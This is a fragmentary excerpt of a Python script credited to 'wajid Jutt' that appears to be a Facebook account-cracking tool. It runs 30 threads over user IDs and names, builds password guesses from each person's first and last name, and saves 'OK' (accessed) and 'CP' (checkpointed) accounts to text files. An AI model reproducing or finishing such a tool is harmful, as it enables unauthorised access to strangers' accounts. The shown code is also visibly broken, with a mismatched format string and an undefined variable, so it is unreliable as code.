...
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37mwajid Jutt
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37mwajid Jutt
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37mMirani-wajid
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mwajid_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mwajid_CP.txt' % (H, P, str(len(cp))))
...
class __xxx__:
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with wajid(max_workers=30) as world:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = zsb.split('|')
                        xz = name.split(' ')
                        first, last = name.split(' ')
                        first123 = first.lower()
                        last123 = last.lower()
                        first786 = first.capitalize()
                        last786= last.capitalize()
